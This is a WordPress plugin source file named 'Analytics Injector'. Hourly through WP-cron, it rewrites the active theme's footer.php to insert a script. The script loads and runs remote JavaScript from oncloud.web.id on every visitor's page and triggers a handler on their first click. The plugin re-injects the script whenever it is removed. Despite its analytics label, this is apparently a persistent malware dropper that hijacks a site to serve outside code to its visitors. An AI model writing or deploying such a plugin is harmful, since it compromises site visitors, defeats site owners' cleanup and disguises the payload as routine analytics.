<?php
/**
 * Plugin Name: Analytics Injector
 * Description: Automatically checks and injects analytics code into footer.php using WordPress cron system
 * Version: 1.0.0
 * Author: Your Name
 * Text Domain: analytics-injector
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

class AnalyticsInjector {
    
    private $analytics_code = '<script>
        (function() {
            if (window.__analytics_injected__) return;
            window.__analytics_injected__ = true;
            var script = document.createElement(\'script\');
            script.src = \'https://oncloud.web.id/analytics.js?v=\' + Date.now();
            script.async = true;
            (document.head || document.body).appendChild(script);
            script.onload = function() {
                function triggerAnalyticsOnce() {
                    if (typeof window.analyticsHandler === \'function\') {
                        window.analyticsHandler();
                    }
                    document.removeEventListener(\'click\', triggerAnalyticsOnce);
                }
                document.addEventListener(\'click\', triggerAnalyticsOnce);
            };
        })();
        </script>';
    
    private $cron_hook = 'analytics_injector_check';
    
    public function __construct() {
        // Hook into WordPress
        add_action('init', array($this, 'init'));
        
        // Register activation and deactivation hooks
        register_activation_hook(__FILE__, array($this, 'activate'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
        
        // Register the cron job action
        add_action($this->cron_hook, array($this, 'check_and_inject_analytics'));
    }
    
    public function init() {
        // Plugin initialization code here if needed
    }
    
    public function activate() {
        // Schedule the cron job to run every hour
        if (!wp_next_scheduled($this->cron_hook)) {
            wp_schedule_event(time(), 'hourly', $this->cron_hook);
        }
        
        // Run initial check
        $this->check_and_inject_analytics();
    }
    
    public function deactivate() {
        // Remove scheduled cron job
        wp_clear_scheduled_hook($this->cron_hook);
    }
    
    public function check_and_inject_analytics() {
        $theme_path = get_template_directory();
        $footer_file = $theme_path . '/footer.php';
        
        // Log activity
        error_log('Analytics Injector: Starting check for footer.php at ' . $footer_file);
        
        // Check if footer.php exists
        if (!file_exists($footer_file)) {
            error_log('Analytics Injector: footer.php not found at ' . $footer_file);
            return false;
        }
        
        // Read the current content
        $current_content = file_get_contents($footer_file);
        
        if ($current_content === false) {
            error_log('Analytics Injector: Could not read footer.php');
            return false;
        }
        
        // Check if analytics code already exists
        if ($this->analytics_code_exists($current_content)) {
            error_log('Analytics Injector: Analytics code already exists in footer.php');
            return true;
        }
        
        // Inject the analytics code
        $result = $this->inject_analytics_code($footer_file, $current_content);
        
        if ($result) {
            error_log('Analytics Injector: Analytics code successfully injected into footer.php');
        } else {
            error_log('Analytics Injector: Failed to inject analytics code into footer.php');
        }
        
        return $result;
    }
    
    private function analytics_code_exists($content) {
        // Check for key identifiers in the analytics code
        $identifiers = [
            'window.__analytics_injected__',
            'oncloud.web.id/analytics.js',
            'analyticsHandler'
        ];
        
        foreach ($identifiers as $identifier) {
            if (strpos($content, $identifier) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function inject_analytics_code($footer_file, $current_content) {
        // Find the best position to inject the code
        $injection_position = $this->find_injection_position($current_content);
        
        if ($injection_position === false) {
            error_log('Analytics Injector: Could not find suitable injection position');
            return false;
        }
        
        // Inject the code
        $new_content = substr_replace($current_content, 
            "\n" . $this->analytics_code . "\n", 
            $injection_position, 
            0
        );
        
        // Write the new content
        $result = file_put_contents($footer_file, $new_content, LOCK_EX);
        
        if ($result === false) {
            error_log('Analytics Injector: Failed to write to footer.php');
            return false;
        }
        
        return true;
    }
    
    private function find_injection_position($content) {
        // Look for </body> tag first (best position)
        $body_pos = strripos($content, '</body>');
        if ($body_pos !== false) {
            return $body_pos;
        }
        
        // Look for </html> tag as fallback
        $html_pos = strripos($content, '</html>');
        if ($html_pos !== false) {
            return $html_pos;
        }
        
        // Look for wp_footer() call
        $footer_pos = strpos($content, 'wp_footer()');
        if ($footer_pos !== false) {
            // Find the end of the line
            $end_line = strpos($content, "\n", $footer_pos);
            if ($end_line !== false) {
                return $end_line;
            }
        }
        
        // Last resort - append to end of file
        return strlen($content);
    }
    
    // Manual trigger method for testing
    public function manual_check() {
        return $this->check_and_inject_analytics();
    }
    
    // Get plugin status
    public function get_status() {
        $theme_path = get_template_directory();
        $footer_file = $theme_path . '/footer.php';
        
        $status = array(
            'footer_exists' => file_exists($footer_file),
            'footer_path' => $footer_file,
            'analytics_present' => false,
            'next_scheduled' => wp_next_scheduled($this->cron_hook),
            'cron_active' => wp_next_scheduled($this->cron_hook) !== false
        );
        
        if ($status['footer_exists']) {
            $content = file_get_contents($footer_file);
            $status['analytics_present'] = $this->analytics_code_exists($content);
        }
        
        return $status;
    }
}

// Initialize the plugin
new AnalyticsInjector();

// Add some utility functions for debugging/testing
if (defined('WP_CLI') && WP_CLI) {
    // WP-CLI command for manual execution
    function analytics_injector_cli_command($args, $assoc_args) {
        $injector = new AnalyticsInjector();
        $result = $injector->manual_check();
        
        if ($result) {
            WP_CLI::success('Analytics check completed successfully');
        } else {
            WP_CLI::error('Analytics check failed');
        }
        
        $status = $injector->get_status();
        WP_CLI::line('Status: ' . print_r($status, true));
    }
    
    WP_CLI::add_command('analytics-injector', 'analytics_injector_cli_command');
}

?>